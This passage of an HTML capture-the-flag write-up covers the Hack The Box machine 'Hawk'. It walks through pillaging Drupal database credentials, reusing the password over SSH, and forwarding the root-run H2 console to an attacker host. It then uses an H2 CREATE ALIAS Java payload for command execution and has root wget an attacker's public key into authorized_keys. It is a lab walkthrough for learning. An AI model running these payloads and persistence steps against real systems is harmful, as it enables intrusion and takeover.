+        Python 2 isn't available, but Python 3 is, so we can spawn a psuedo-interactive shell.<br>
+        You can grab <code>user.txt</code> from <code>/home/daniel</code>.<br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">which</span>&nbsp;python<br>
+                <span style="color:#ff9d00;font-weight:700">which</span>&nbsp;python3<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>python3<br>
+                python3&nbsp;-c&nbsp;<span style="color:#3ad900;font-weight:400">'import&nbsp;pty;&nbsp;pty.spawn("/bin/bash")'</span><br>
+                www-data@hawk<span style="color:#ff9d00;font-weight:700">:/</span>home$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh<br>
+                <span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh<br>
+                total&nbsp;12K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;3&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;16&nbsp;&nbsp;2018&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;23&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;12&nbsp;&nbsp;2018&nbsp;..<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;5&nbsp;daniel&nbsp;daniel&nbsp;4.0K&nbsp;Jul&nbsp;&nbsp;1&nbsp;&nbsp;2018&nbsp;daniel<br>
+                www-data@hawk<span style="color:#ff9d00;font-weight:700">:/</span>home$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh&nbsp;daniel<br>
+                <span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh&nbsp;daniel<br>
+                total&nbsp;36K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;5&nbsp;daniel&nbsp;daniel&nbsp;4.0K&nbsp;Jul&nbsp;&nbsp;1&nbsp;&nbsp;2018&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;3&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;16&nbsp;&nbsp;2018&nbsp;..<br>
+                lrwxrwxrwx&nbsp;1&nbsp;daniel&nbsp;daniel&nbsp;&nbsp;&nbsp;&nbsp;9&nbsp;Jul&nbsp;&nbsp;1&nbsp;&nbsp;2018&nbsp;.bash_history&nbsp;-&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null<br>
+                drwx------&nbsp;2&nbsp;daniel&nbsp;daniel&nbsp;4.0K&nbsp;Jun&nbsp;12&nbsp;&nbsp;2018&nbsp;.cache<br>
+                drwx------&nbsp;3&nbsp;daniel&nbsp;daniel&nbsp;4.0K&nbsp;Jun&nbsp;12&nbsp;&nbsp;2018&nbsp;.gnupg<br>
+                -rw-------&nbsp;1&nbsp;daniel&nbsp;daniel&nbsp;&nbsp;136&nbsp;Jun&nbsp;12&nbsp;&nbsp;2018&nbsp;.lesshst<br>
+                -rw-------&nbsp;1&nbsp;daniel&nbsp;daniel&nbsp;&nbsp;342&nbsp;Jun&nbsp;12&nbsp;&nbsp;2018&nbsp;.lhistory<br>
+                drwx------&nbsp;2&nbsp;daniel&nbsp;daniel&nbsp;4.0K&nbsp;Jun&nbsp;12&nbsp;&nbsp;2018&nbsp;.links2<br>
+                lrwxrwxrwx&nbsp;1&nbsp;daniel&nbsp;daniel&nbsp;&nbsp;&nbsp;&nbsp;9&nbsp;Jul&nbsp;&nbsp;1&nbsp;&nbsp;2018&nbsp;.python_history&nbsp;-&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null<br>
+                -rw-------&nbsp;1&nbsp;daniel&nbsp;daniel&nbsp;&nbsp;814&nbsp;Jun&nbsp;12&nbsp;&nbsp;2018&nbsp;.viminfo<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;daniel&nbsp;daniel&nbsp;&nbsp;&nbsp;33&nbsp;Jun&nbsp;16&nbsp;&nbsp;2018&nbsp;user.txt<br>
+                www-data@hawk<span style="color:#ff9d00;font-weight:700">:/</span>home$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;daniel<span style="color:#ff9d00;font-weight:700">/</span>user.txt<br>
+                <span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;daniel<span style="color:#ff9d00;font-weight:700">/</span>user.txt<br>
+                d5111d4f...
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>4) /var/www/html</strong></h2><br>
+        If you check <code>/var/www/html</code>, you'll find the mysql credentials for drupal inside of <code>sites/default/settings.php</code><br>
+            <div class="codebox">
+                www-data@hawk<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>html$&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;-r&nbsp;password&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>html<br>
+                [...]<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>html<span style="color:#ff9d00;font-weight:700">/</span>sites<span style="color:#ff9d00;font-weight:700">/</span>default<span style="color:#ff9d00;font-weight:700">/</span>settings.php<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'password'</span>&nbsp;=&gt;&nbsp;<span style="color:#3ad900;font-weight:400">'drupal4hawk'</span><br>
+                www-data@hawk<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>html$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>html<span style="color:#ff9d00;font-weight:700">/</span>sites<span style="color:#ff9d00;font-weight:700">/</span>default<span style="color:#ff9d00;font-weight:700">/</span>settings.php<br>
+                [...]<br>
+                <span style="color:#7f0044;font-weight:400">$databases</span>&nbsp;=&nbsp;array&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><br>
+                &nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'default'</span>&nbsp;=&gt;&nbsp;<br>
+                &nbsp;&nbsp;array&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'default'</span>&nbsp;=&gt;&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;array&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'database'</span>&nbsp;=&gt;&nbsp;<span style="color:#3ad900;font-weight:400">'drupal'</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'username'</span>&nbsp;=&gt;&nbsp;<span style="color:#3ad900;font-weight:400">'drupal'</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'password'</span>&nbsp;=&gt;&nbsp;<span style="color:#3ad900;font-weight:400">'drupal4hawk'</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'host'</span>&nbsp;=&gt;&nbsp;<span style="color:#3ad900;font-weight:400">'localhost'</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'port'</span>&nbsp;=&gt;&nbsp;<span style="color:#3ad900;font-weight:400">''</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'driver'</span>&nbsp;=&gt;&nbsp;<span style="color:#3ad900;font-weight:400">'mysql'</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'prefix'</span>&nbsp;=&gt;&nbsp;<span style="color:#3ad900;font-weight:400">''</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>,<br>
+                &nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>,<br>
+                <span style="color:#ff9d00;font-weight:700">);</span>
+            </div>
+        </div><br>
+        <br>
+        Fortunately, daniel reused his mysql password for his user account, so we can log in as daniel via ssh using his password - <code>drupal4hawk</code><br>
+            <div class="codebox">
+                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>hawk]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#ssh&nbsp;daniel@hawk.htb</span><br>
+                daniel@hawk.htbs&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;drupal4hawk<br>
+                Welcome&nbsp;to&nbsp;Ubuntu&nbsp;18.04&nbsp;LTS&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>GNU<span style="color:#ff9d00;font-weight:700">/</span>Linux&nbsp;4.15.0-23-generic&nbsp;x86_64<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                &nbsp;*&nbsp;Documentation<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>help.ubuntu.com<br>
+                &nbsp;*&nbsp;Management<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>landscape.canonical.com<br>
+                &nbsp;*&nbsp;Support<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>ubuntu.com<span style="color:#ff9d00;font-weight:700">/</span>advantage<br>
+                <br>
+                &nbsp;&nbsp;System&nbsp;information&nbsp;as&nbsp;of&nbsp;Thu&nbsp;Nov&nbsp;&nbsp;7&nbsp;18<span style="color:#ff9d00;font-weight:700">:</span>09<span style="color:#ff9d00;font-weight:700">:</span>46&nbsp;UTC&nbsp;2019<br>
+                <br>
+                &nbsp;&nbsp;System&nbsp;load<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Processes<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;121<br>
+                &nbsp;&nbsp;Usage&nbsp;of&nbsp;<span style="color:#ff9d00;font-weight:700">/:</span>&nbsp;&nbsp;&nbsp;54.4%&nbsp;of&nbsp;9.78GB&nbsp;&nbsp;&nbsp;Users&nbsp;logged&nbsp;in<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0<br>
+                &nbsp;&nbsp;Memory&nbsp;usage<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;74%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IP&nbsp;address&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">ens33</span>:&nbsp;10.10.10.102<br>
+                &nbsp;&nbsp;Swap&nbsp;usage:&nbsp;&nbsp;&nbsp;1%<br>
+                <br>
+                <br>
+                &nbsp;*&nbsp;Canonical&nbsp;Livepatch&nbsp;is&nbsp;available&nbsp;for&nbsp;installation.<br>
+                &nbsp;&nbsp;&nbsp;-&nbsp;Reduce&nbsp;system&nbsp;reboots&nbsp;and&nbsp;improve&nbsp;kernel&nbsp;security.&nbsp;Activate&nbsp;at:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://ubuntu.com/livepatch<br>
+                <br>
+                55&nbsp;packages&nbsp;can&nbsp;be&nbsp;updated.<br>
+                3&nbsp;updates&nbsp;are&nbsp;security&nbsp;updates.<br>
+                <br>
+                <br>
+                Last&nbsp;login:&nbsp;Sun&nbsp;Jul&nbsp;&nbsp;1&nbsp;13:46:16&nbsp;2018&nbsp;from&nbsp;dead:beef:2::1004<br>
+                Python&nbsp;3.6.5&nbsp;(default,&nbsp;Apr&nbsp;&nbsp;1&nbsp;2018,&nbsp;05:46:30)&nbsp;<br>
+                [GCC&nbsp;7.3.0]&nbsp;on&nbsp;linux<br>
+                Type&nbsp;"help",&nbsp;"copyright",&nbsp;"credits"&nbsp;or&nbsp;"license"&nbsp;for&nbsp;more&nbsp;information.<br>
+                &gt;&gt;&gt;
+            </div>
+        </div><br>
+        <br>
+        Daniel's shell is a python interactive shell. Odd.<br>
+        You can escape it by importing <code>pty</code> and spawning a <code>/bin/bash</code> shell.<br>
+            <div class="codebox">
+                &gt;&gt;&gt;&nbsp;import&nbsp;pty<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;pty.spawn<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"/bin/bash"</span><span style="color:#ff9d00;font-weight:700">)</span><br>
+                daniel@hawk<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">id</span><br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=1002<span style="color:#ff9d00;font-weight:700">(</span>daniel<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=1005<span style="color:#ff9d00;font-weight:700">(</span>daniel<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=1005<span style="color:#ff9d00;font-weight:700">(</span>daniel<span style="color:#ff9d00;font-weight:700">)</span><br>
+                daniel@hawk<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-4" name="h1-4"></a><strong></strong>
+        <h1><strong>Priv-Esc to root</strong></h1>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>5) h2</strong></h2><br>
+        If you check for processes running as root, you'll see <code>h2</code>, which we saw earlier in our nmap results.<br>
+            <div class="codebox">
+                daniel@hawk<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">ps</span>&nbsp;aux&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;root<br>
+                [...]<br>
+                root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;833&nbsp;&nbsp;0.0&nbsp;&nbsp;0.0&nbsp;&nbsp;&nbsp;4628&nbsp;&nbsp;&nbsp;860&nbsp;?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ss&nbsp;&nbsp;&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>00&nbsp;&nbsp;&nbsp;0<span style="color:#ff9d00;font-weight:700">:</span>00&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span>&nbsp;-c&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>java&nbsp;-jar&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>h2<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>h2-1.4.196.jar<br>
+                root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;834&nbsp;&nbsp;0.7&nbsp;&nbsp;5.2&nbsp;2329256&nbsp;52072&nbsp;?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sl&nbsp;&nbsp;&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>00&nbsp;&nbsp;&nbsp;0<span style="color:#ff9d00;font-weight:700">:</span>02&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>java&nbsp;-jar&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>h2<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>h2-1.4.196.jar<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        We couldn't access h2 externally, but now with access to the target system we can port forward H2 out to our attacking system to gain access to it.<br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>5a) Port Forward</strong></h3><br>
+        <code>daniel</code>'s default shell is python3, which means we can't local port forward H2 (connect from our attacking machine port forward with -L). Instead, we'll have to remote port forward from a /bin/bash instance as daniel.<br>
+        <br>
+        Allow for root login over SSH using a password by modifying <code>sshd_config</code>, and restart your ssh service to configure the changes.<br>
+            <div class="codebox">
+                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;/etc/ssh/sshd_config</span><br>
+                [...]<br>
+                PermitRootLogin&nbsp;yes<br>
+                [...]<br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#service&nbsp;ssh&nbsp;restart</span>
+            </div>
+        </div><br>
+        <br>
+        <code>-R</code> specifies the port to forward (8082)<br>
+        <code>127.0.0.1:8082</code> specifies for the forwarded port to run on local host (our attacking maching) on port 8082<br>
+        <code>-N</code> means ‘don't execute commands'<br>
+            <div class="codebox">
+                daniel@hawk<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;-R&nbsp;8082<span style="color:#ff9d00;font-weight:700">:</span>127.0.0.1<span style="color:#ff9d00;font-weight:700">:</span>8082&nbsp;bob@10.10.14.7&nbsp;-N<br>
+                bob@10.10.14.7<span style="color:#3ad900;font-weight:400">'s&nbsp;password:&nbsp;drupal4hawk</span>
+            </div>
+        </div><br>
+        <br>
+        The SSH port forward should hang.<br>
+        On your attacking machine you should see 8082 listening on local host.<br>
+            <div class="codebox">
+                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>hawk]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#netstat&nbsp;-panut&nbsp;|&nbsp;grep&nbsp;8082</span><br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;127.0.0.1<span style="color:#ff9d00;font-weight:700">:</span>8082&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0<span style="color:#ff9d00;font-weight:700">:</span>*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;49589<span style="color:#ff9d00;font-weight:700">/</span>sshd<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                tcp6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;<span style="color:#ff9d00;font-weight:700">::</span>1<span style="color:#ff9d00;font-weight:700">:</span>8082&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">:::</span>*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;49589<span style="color:#ff9d00;font-weight:700">/</span>sshd<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;root&nbsp;
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>5b) Change database URL</strong></h3><br>
+        Browse to the H2 database console at <code>http://127.0.0.1:8082</code><br>
+        <img alt="images\2-7.png" src="images/2-7.png"><br>
+        <br>
+        By default, H2 doesn't require credentials.<br>
+        However, with the current settings, we can't access the database.<br>
+        <img alt="images\2-8.png" src="images/2-8.png"><br>
+        <br>
+        This is because the H2 database is running as root, and the URL of the database is in <code>~/test</code> i.e. <code>/root/test</code><br>
+        We don't have access to /root, so we can't access the database.<br>
+        <br>
+        Instead, change the database URL to a folder that we have write access to.<br>
+        <img alt="images\2-9.png" src="images/2-9.png"><br>
+        <br>
+        We can get in now!<br>
+        <img alt="images\2-10.png" src="images/2-10.png"><br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>5c) Execute code</strong></h3><br>
+        This blog entry is excellent (I think this guy found the code executino capabilties in H2?) - <a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html</a><br>
+        <br>
+        We can execute code against the H2 database using CREATE ALIAS and inserting Java code.<br>
+        <br>
+        <code>CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : ""; }$$;</code><br>
+        <br>
+        You can then execute code by calling your SHELLEXEC alias and a command.<br>
+        <code>CALL SHELLEXEC('id')</code><br>
+        <br>
+        <img alt="images\2-11.png" src="images/2-11.png"><br>
+        <br>
+        Nothing of the usual reverse shells worked.<br>
+        <br>
+        The database is running as root, which means we have read access to root's home directory.<br>
+        <img alt="images\2-12.png" src="images/2-12.png"><br>
+        <br>
+        <code>root</code> has a .ssh directory, and an <code>authorized_keys</code> file, so we can add our key to the <code>authorized_keys</code> to gain access as root.<br>
+        <img alt="images\2-13.png" src="images/2-13.png"><br>
+        <br>
+        Generate an SSH key if you don't have one<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>hawk<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#ssh-keygen&nbsp;-t&nbsp;rsa&nbsp;-b&nbsp;4096</span><br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        Copy your public key into a working directory<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>hawk<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#cp&nbsp;/root/.ssh/id_rsa.pub&nbsp;.</span>
+            </div>
+        </div><br>
+        <br>
+        And serve the key to the target with a python web server<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>hawk<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#python&nbsp;-m&nbsp;SimpleHTTPServer&nbsp;</span><br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Have root <code>wget</code> your public key from your attacking machine and save it to the target as root's <code>authorized_keys</code> file.<br>
+        <img alt="images\2-14.png" src="images/2-14.png"><br>
+        <br>
+        You should see your public key get retrieved from your web server.<br>
+            <div class="codebox">
+                [...]<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...<br>
+                10.10.10.102&nbsp;-&nbsp;-&nbsp;[10<span style="color:#ff9d00;font-weight:700">/</span>Nov<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>01<span style="color:#ff9d00;font-weight:700">:</span>28]&nbsp;<span style="color:#3ad900;font-weight:400">"GET&nbsp;/id_rsa.pub&nbsp;HTTP/1.1"</span>&nbsp;200&nbsp;-
+            </div>
+        </div><br>
+        <br>
+        You'll now be able to ssh into the target as root :)<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>hawk<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#ssh&nbsp;root@10.10.10.102</span><br>
+                Welcome&nbsp;to&nbsp;Ubuntu&nbsp;18.04&nbsp;LTS&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>GNU<span style="color:#ff9d00;font-weight:700">/</span>Linux&nbsp;4.15.0-23-generic&nbsp;x86_64<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                [...]<br>
+                root@hawk<span style="color:#ff9d00;font-weight:700">:</span>~#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;root.txt<br>
+                54f3e840fe5...
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
